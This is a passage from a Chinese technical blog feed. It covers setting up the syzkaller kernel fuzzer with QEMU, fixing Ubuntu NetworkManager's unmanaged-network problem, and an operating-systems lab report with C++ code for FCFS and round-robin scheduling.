code-wrapper"><pre><code class="hljs terminal">ssh -i /home/zino/syz/image/stretch.id_rsa -p 10021 -o &quot;StrictHostKeyChecking no&quot; root@localhost<br></code></pre></div></td></tr></table></figure><p>成功在另一个终端创建连接</p><p><img src="/posts/60fc7e01/image-20211127143344050.png" alt="image-20211127143344050"></p><p>之后用poweroff关闭虚拟机</p><p>开始安装syzkaller</p><h3 id="安装syzkaller"><a class="markdownIt-Anchor" href="#安装syzkaller"></a> 安装syzkaller</h3><ul><li><p>go环境配置</p><p><code>syzkaller</code>是用go语言写的，所以需要首先配置go环境，安装go的安装包来配置</p>  <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">wget https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz<br>tar -xf go1.14.2.linux-amd64.tar.gz<br>mv go goroot<br>mkdir gopath<br>export GOPATH=`pwd`/gopath<br>export GOROOT=`pwd`/goroot<br>export PATH=$GOPATH/bin:$PATH<br>export PATH=$GOROOT/bin:$PATH<br></code></pre></div></td></tr></table></figure></li><li><p>下载<code>syzkaller</code></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">go get -u -d github.com/google/syzkaller/prog #有点慢，直接git clone<br>#下面的路径可以自己建立，也可以不建，这样就自己指定路径，记得后面用这个路径就行<br>git clone https://github.com/google/syzkaller.git<br>cd gopath/src/github.com/google/syzkaller/<br>make<br></code></pre></div></td></tr></table></figure><blockquote><p><strong>make后出现错误</strong></p><p><img src="/posts/60fc7e01/QQ%E5%9B%BE%E7%89%8720211127225142.jpg" alt="make错误"></p><p>搜索了之后发现这是由于make是内存不够导致的，所以学习了一下如何创建交换分区来缓解内存压力</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">&gt;#创建用于交换分区的文件<br>&gt;dd if=/dev/zero of=/swapfile bs=1M count=2048<br>&gt;#设置交换分区文件<br>&gt;mkswap /swapfile<br>&gt;#立即启用交换分区文件<br>&gt;swapon /swapfile<br>&gt;#打开/etc/fstab<br>&gt;sudo vim /etc/fstab<br>&gt;#在下面添加下面一行，使其永久有效<br>&gt;/swapfile swap swap defaults 0 0<br></code></pre></div></td></tr></table></figure><p>之后再次make就成功了</p><p>参考链接：<a href="https://blog.csdn.net/zhangxiaoyang0/article/details/82501209">Linux上创建SWAP文件/分区</a></p></blockquote><p>可以看到/syzkaller/bin下出现下列文件</p><p><img src="/posts/60fc7e01/image-20211127230030934.png" alt="image-20211127230030934"></p></li><li><p>运行syzkaller manager</p><p>首先需要自己建立一个配置文件my.cfg，作为syzkaller的配置文件</p><p>我的配置路径如下：</p><figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;linux/amd64&quot;</span>,<br><span class="hljs-attr">&quot;http&quot;</span>: <span class="hljs-string">&quot;127.0.0.1:56741&quot;</span>,<br><span class="hljs-attr">&quot;workdir&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/gopath/src/github.com/google/syzkaller/workdir&quot;</span>,<br><span class="hljs-attr">&quot;kernel_obj&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/linux-5.14&quot;</span>,<br><span class="hljs-attr">&quot;image&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/image/stretch.img&quot;</span>,<br><span class="hljs-attr">&quot;sshkey&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/image/stretch.id_rsa&quot;</span>,<br><span class="hljs-attr">&quot;syzkaller&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/gopath/src/github.com/google/syzkaller&quot;</span>,<br><span class="hljs-attr">&quot;procs&quot;</span>: <span class="hljs-number">8</span>,<br><span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;qemu&quot;</span>,<br><span class="hljs-attr">&quot;vm&quot;</span>: &#123;<br><span class="hljs-attr">&quot;count&quot;</span>: <span class="hljs-number">4</span>,<br><span class="hljs-attr">&quot;kernel&quot;</span>: <span class="hljs-string">&quot;/home/zino/syz/linux-5.14/arch/x86/boot/bzImage&quot;</span>,<br><span class="hljs-attr">&quot;cpu&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-attr">&quot;mem&quot;</span>: <span class="hljs-number">2048</span>,<br>#<span class="hljs-attr">&quot;qemu_args&quot;</span>: <span class="hljs-string">&quot;-enable-kvm&quot;</span><br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>然后还需要创建一个syzkaller的工作区，用来存放crash信息等</p><p>然后就可以直接开始运行syzkaller了</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">mkdir workdir<br>./bin/syz-manager -config=my.cfg<br></code></pre></div></td></tr></table></figure><blockquote><p>but果然最后一步还是没有那么顺利</p><p>报错如下</p><p><img src="/posts/60fc7e01/QQ%E5%9B%BE%E7%89%8720211127230728.jpg" alt="QQ图片20211127230728"></p><p>努力了很久，找到了一个解决方法（原因有待思考）：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">sudo vim /etc/default/grub<br>#将最后一行修改成<br>GRUB_CMDLINE_LINUX=&quot;console=ttyS0 console=ttyS0,115200n81 no_timer_check  crashkernel=auto rhgb quiet kvm.ignore_msrs=1&quot;<br>#更新配置<br>grub-mkconfig -o &quot;$(readlink -e /etc/grub2.conf)&quot;<br>#使配置生效<br>echo 1 | sudo tee /sys/module/kvm/parameters/ignore_msrs<br></code></pre></div></td></tr></table></figure><p>这时候再去执行<code>./bin/syz-manager -config=my.cfg</code>就可以成功了</p><p>博客上说是重启生效，但是不重启有效，重启后就又不行了，所以感觉还是有点问题</p><p>参考链接：<a href="https://cloudnull.io/2020/07/fixing-msrs-errors-in-nested-virt/">Fixing MSR 0xe1 to 0x0</a></p><p>后来在官方的troubleshooting里找到了解决方法</p><p><img src="/posts/60fc7e01/QQ%E5%9B%BE%E7%89%8720211127214133-16380205507012.png" alt="问题解决方法"></p><p>在官方给的配置文件的最后一行加上</p><p><code>&quot;qemu_args&quot;: &quot;-enable-kvm&quot;</code></p><p>即把上方的配置文件的最后一行注释取消</p></blockquote></li></ul><p>再次执行<code>./bin/syz-manager -config=my.cfg</code></p><p>成功！</p><p><img src="/posts/60fc7e01/image-20211127185108620.png" alt="image-20211127185108620"></p><p>web端也成功显示</p><p><img src="/posts/60fc7e01/image-20211127185004493.png" alt="image-20211127185004493"></p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>syzkaller</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机网络托管消失的问题</title>
    <link href="/posts/1326caf9/"/>
    <url>/posts/1326caf9/</url>
    
    <content type="html"><![CDATA[<p>如图所示，Ubuntu20.04频繁出现网络未托管的现象，右上角网络连接图标消失</p><p><img src="/posts/1326caf9/image-20211127204523849.png" alt="image-20211127204523849"></p><p>虚拟机的网络除了可以修改/etc/network/interfaces来进行配置以外；还可以直接在network-manager中配置。</p><ul><li><p>通过 interfaces修改的方法参照Server版本。</p></li><li><p>network-manager的配置很直观，按照提示一步一步操作即可，有兴趣的朋友，可以自行Google或者Baidu。</p></li></ul><p>但如果修改了interfaces，又配置了network-manager（以下简称nm），就可能会出现了一些莫名其妙的问题:</p><ol><li><p>interfaces和 nm中的网络设置不一样，系统实际的IP是哪个？</p></li><li><p>有时候莫名其妙的，界面右上角的网络连接图标就丢失了。</p></li><li><p>明明在nm中配置了正确的网络设置，为什么就上不了网呢？</p></li></ol><p>首先，当系统内没有第三方网络管理工具（比如nm）时，系统默认使用interfaces文件内的参数进行网络配置。（就像Server版本一样）</p><p>接着，当系统内安装了 nm之后，nm默认接管了系统的网络配置，使用nm 自己的网络配置参数来进行配置。</p><p>但是，如果用户在安装nm之后，自己手动修改了interfaces 文件，那nm就自动停止对系统网络的管理，系统改使用interfaces 文件内的参数进行网络配置。</p><p>此时，再去修改nm 内的参数，不影响系统实际的网络配置。若要让nm 内的配置生效，必须重新启用nm 接管系统的网络配置。</p><p>现在知道了两者之间的工作关系，再看上面的三个问题：</p><ol><li><p>要看nm是否接管，如果没有接管，系统实际的IP设置以interfaces 中的为准。反之，以nm 中的为准。</p></li><li><p>当nm 停止接管的时候，网络连接图标就丢失了。</p></li><li><p>同样是接管的问题。</p></li></ol><p>如果用户希望直接使用interfaces 进行网络配置，那最好删除network-manager 。</p><p>如果在出现上述问题之后，希望能继续使用nm 来进行网络配置，则需要进行如下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal"># 停止 nm服务<br>sudo service network-manager stop <br># 打开nm 的配置文件(具体配置文件名字进入目录看，可能不太一样)<br>sudo vim /etc/NetworkManager/NetworkManager.conf <br></code></pre></div></td></tr></table></figure><p><strong>里面有一行：managed=true</strong></p><p><strong>如果你手工改过/etc/network/interfaces，nm会自己把这行改成：managed=false</strong></p><p><strong>将false 修改成true</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">#重启nm服务<br>sudo service network-manager start<br></code></pre></div></td></tr></table></figure><p>然后</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal"># 开启NM托管<br>nmcli n on<br></code></pre></div></td></tr></table></figure><p>有时候开关机后网络连接图标仍会消失，查看配置文件已经设置为了true,这时候再执行一遍下面三条命令后可以成功恢复网络。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">sudo service network-manager <span class="hljs-built_in">stop</span><br>sudo service network-manager <span class="hljs-built_in">start</span><br>nmcli n <span class="hljs-keyword">on</span><br></code></pre></div></td></tr></table></figure><p><strong>参考链接</strong></p><p><a href="https://blog.csdn.net/vic_qxz/article/details/118863177?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-2&amp;spm=1001.2101.3001.4242.1"> NetworkManager设置_networkmanager配置文件</a></p><p><a href="https://www.cnblogs.com/sankye/p/5020721.html?ivk_sa=1024320u">Ubuntu中启用关闭Network-manager网络设置问题</a></p>]]></content>
    
    
    <categories>
      
      <category>Memo</category>
      
      <category>Debug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Debug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统Lab4-调度算法</title>
    <link href="/posts/3f961b4f/"/>
    <url>/posts/3f961b4f/</url>
    
    <content type="html"><![CDATA[<h1 id="调度算法"><a class="markdownIt-Anchor" href="#调度算法"></a> 调度算法</h1><h2 id="一-实验内容"><a class="markdownIt-Anchor" href="#一-实验内容"></a> 一、实验内容</h2><ul><li>实现先来先服务调度算法（SPF）</li><li>实现时间片轮转调度算法（RR）</li></ul><h2 id="二-实验目的"><a class="markdownIt-Anchor" href="#二-实验目的"></a> 二、实验目的</h2><ul><li>通过对进程调度算法的设计，深入理解进程调度的原理。</li><li>进程是程序在一个数据集合上运行的过程，它是系统进行资源分配和调度的一个独立单位。</li><li>进程调度分配处理机，是控制协调进程对CPU的竞争，即按一定的调度算法从就绪队列中选<br>中一个进程，把CPU的使用权交给被选中的进程。</li></ul><h2 id="三-实验题目"><a class="markdownIt-Anchor" href="#三-实验题目"></a> 三、实验题目</h2><ol><li>先来先服务（FCFS）调度算法</li></ol><ul><li>原理：每次调度是从就绪队列中，选择一个最先进入就绪队列的进程，把处理器分配给该进程，使之得到执行。该进程一旦占有了处理器，它就一直运行下去，直到该进程完成或因发生事件而阻塞，才退出处理器。</li><li>将用户作业和就绪进程按提交顺序或变为就绪状态的先后排成队列，并按照先来先服务的方式进行调度处理，是一种最普遍和最简单的方法。它优先考虑在系统中等待时间最长的作业，而不管要求运行时间的长短。</li><li>按照就绪进程进入就绪队列的先后次序进行调度，简单易实现，利于长进程，CPU繁忙型作业，不利于短进程，排队时间相对过长</li></ul><p><img src="/posts/3f961b4f/image-20211112131036353.png" alt="image-20211112131036353"></p><ol start="2"><li>时间片轮转调度算法RR</li></ol><ul><li>原理：时间片轮转法主要用于进程调度。采用此算法的系统，其程序就绪队列往往按进程到达的时间来排序。进程调度按一定时间片(q)轮番运行各个进程.</li><li>进程按到达时间在就绪队列中排队，调度程序每次把CPU分配给就绪队列首进程使用一个时间片，运行完一个时间片释放CPU，排到就绪队列末尾参加下一轮调度，CPU分配给就绪队列的首进程。</li><li>固定时间片轮转法：<br>1 所有就绪进程按 FCFS 规则排队。<br>2 处理机总是分配给就绪队列的队首进程。<br>3 如果运行的进程用完时间片，则系统就把该<br>进程送回就绪队列的队尾，重新排队。<br>4 因等待某事件而阻塞的进程送到阻塞队列。<br>5 系统把被唤醒的进程送到就绪队列的队尾</li></ul><p><img src="/posts/3f961b4f/image-20211112130639647.png" alt="image-20211112130639647"></p><h2 id="四-实验设计和过程"><a class="markdownIt-Anchor" href="#四-实验设计和过程"></a> 四、实验设计和过程</h2><h3 id="fcfs调度算法"><a class="markdownIt-Anchor" href="#fcfs调度算法"></a> FCFS调度算法</h3><h4 id="数据结构"><a class="markdownIt-Anchor" href="#数据结构"></a> 数据结构</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Process</span> //进程结构体，表示进程信息</span><br><span class="hljs-class">&#123;</span><br>    string name;         <span class="hljs-comment">//进程名字</span><br>    <span class="hljs-keyword">int</span> arrive_time;     <span class="hljs-comment">//到达时间</span><br>    <span class="hljs-keyword">int</span> service_time;    <span class="hljs-comment">//进程运行时间</span><br>    <span class="hljs-keyword">int</span> wait_time;       <span class="hljs-comment">//进程等待时间</span><br>    <span class="hljs-keyword">int</span> remain_time;     <span class="hljs-comment">//进程剩余运行时间</span><br>    <span class="hljs-keyword">int</span> turnaround_time; <span class="hljs-comment">//周转时间</span><br>    <span class="hljs-keyword">int</span> start_time;      <span class="hljs-comment">//进程开始运行时间</span><br>    <span class="hljs-keyword">int</span> end_time;        <span class="hljs-comment">//进程结束时间</span><br>    <span class="hljs-comment">//int time_slice;      //进程时间片</span><br>&#125; run_process, p[MAXname];<br>queue&lt;Process&gt; ready_queue, block_queue;<br></code></pre></div></td></tr></table></figure><h4 id="符号说明"><a class="markdownIt-Anchor" href="#符号说明"></a> 符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;                <span class="hljs-comment">//进程数量</span><br><span class="hljs-keyword">int</span> current_time = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前时间</span><br><span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><h4 id="函数说明"><a class="markdownIt-Anchor" href="#函数说明"></a> 函数说明</h4><h5 id="进程初始化函数"><a class="markdownIt-Anchor" href="#进程初始化函数"></a> <strong>进程初始化函数</strong></h5><blockquote><p>获取进程信息</p><ul><li>将进程按照到达时间加入阻塞队列</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">()</span> <span class="hljs-comment">//进程初始化</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入进程数量&quot;</span> &lt;&lt; endl;<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;请输入第&quot;</span> &lt;&lt; i + <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-string">&quot;个进程的名字  到达时间  服务时间&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; p[i].name &gt;&gt; p[i].arrive_time &gt;&gt; p[i].service_time;<br>        p[i].remain_time = p[i].service_time;<br>    &#125;<br>    run_process.name = <span class="hljs-string">&quot;0&quot;</span>; <span class="hljs-comment">//当前无进程运行</span><br>    <span class="hljs-built_in">sort</span>(p, p + n, cmp);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        block_queue.<span class="hljs-built_in">push</span>(p[i]); <span class="hljs-comment">//将进程加入阻塞队列（未达到则视为阻塞）</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="获取下一个进程函数"><a class="markdownIt-Anchor" href="#获取下一个进程函数"></a> <strong>获取下一个进程函数</strong></h5><blockquote><p>这部分代码重复率较高，故抽象出来组成函数</p><ul><li>当就绪队列非空时，从中取出一个进程运行，同时计算该进程的等待时间</li><li>否则将当前进程置为空</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">nextprocess</span><span class="hljs-params">()</span> <span class="hljs-comment">//取下一个进程</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>()) <span class="hljs-comment">//当就绪队列非空时</span><br>    &#123;<br>        run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//取下个进程</span><br>        run_process.start_time=current_time;<br>        run_process.wait_time += current_time - run_process.arrive_time; <span class="hljs-comment">//计算等待时间</span><br>        ready_queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">//否则将运行进程置为空</span><br>        run_process.name = <span class="hljs-string">&quot;0&quot;</span>;<br>    <br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="进程调度函数"><a class="markdownIt-Anchor" href="#进程调度函数"></a> <strong>进程调度函数</strong></h5><blockquote><p>实现进程调度</p><ul><li>当就绪队列、阻塞队列、运行进程都为空时，说明进程全部运行完，结束程序</li><li>当阻塞队列非空且队首元素到达时间已到当前时间，则将阻塞队列队首元素加入就绪队列，并将其从阻塞队列删除</li><li>就绪队列非空和运行进程为空时，则从就绪队列取元素，并将其从阻塞队列删除</li><li>当有进程运行时，输出进程信息，同时改变当前时间等信息</li><li>如果当前进程时间片用完，则将其记录，同时获取下一个进程，程序继续循环</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">()</span> <span class="hljs-comment">//进程调度函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//随机数种子</span><br>    cout &lt;&lt; endl<br>         &lt;&lt; <span class="hljs-string">&quot;------------------------------------FCFS调度算法------------------------------------&quot;</span> &lt;&lt; endl<br>         &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;当前时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;当前进程  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程到达时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程等待时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程服务时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;剩余运行时间  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//当三个队列均为空时，说明进程全部运行完</span><br>            <span class="hljs-keyword">break</span>;                                                                 <span class="hljs-comment">//结束</span><br><br>        <span class="hljs-keyword">if</span> (!block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; block_queue.<span class="hljs-built_in">front</span>().arrive_time &lt;= current_time)<br>        &#123;                                                   <span class="hljs-comment">//阻塞队列非空且队首元素到达时间已到当前时间</span><br>            block_queue.<span class="hljs-built_in">front</span>().arrive_time = current_time; <span class="hljs-comment">//将进入就绪队列的时间作为进程到达时间（针对于阻塞过的进程）</span><br>            ready_queue.<span class="hljs-built_in">push</span>(block_queue.<span class="hljs-built_in">front</span>());          <span class="hljs-comment">//则加入就绪队列</span><br>            block_queue.<span class="hljs-built_in">pop</span>();                              <span class="hljs-comment">//从阻塞队列删除</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//就绪队列非空和运行进程为空时</span><br>        &#123;<br>            run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//则从就绪队列取首元素</span><br>            run_process.start_time=current_time;<br>            ready_queue.<span class="hljs-built_in">pop</span>();                 <span class="hljs-comment">//从就绪队列删除</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//若当前无运行进程，则输出空</span><br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name &lt;&lt; endl;<br>            current_time++;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123; <span class="hljs-comment">//当前有运行进程则输出信息</span><br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.arrive_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.wait_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.service_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.remain_time<br>                 &lt;&lt; endl;<br>            current_time++;            <span class="hljs-comment">//当前时间加1</span><br>            run_process.remain_time--; <span class="hljs-comment">//进程剩余运行时间减1</span><br><br>            <span class="hljs-keyword">if</span> (run_process.remain_time == <span class="hljs-number">0</span>) <span class="hljs-comment">//当进程剩余运行时间为0</span><br>            &#123;<br>                run_process.end_time=current_time;<br>                run_process.turnaround_time=current_time-run_process.start_time;<br>                p[t++] = run_process;<br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//取下一个进程</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">block</span>()) <span class="hljs-comment">//当进程有运行时间和时间片时，可能发生阻塞</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;-----------------进程阻塞，切换进程----------------&quot;</span> &lt;&lt; endl;<br>                run_process.arrive_time = current_time; <span class="hljs-comment">//若发生阻塞，修改当前进程到达时间</span><br>                block_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//并加入阻塞队列中</span><br>                <span class="hljs-built_in">nextprocess</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="打印进程信息函数"><a class="markdownIt-Anchor" href="#打印进程信息函数"></a> <strong>打印进程信息函数</strong></h5><blockquote><p>输出进程信息，并输出整个过程的平均等待时间</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span 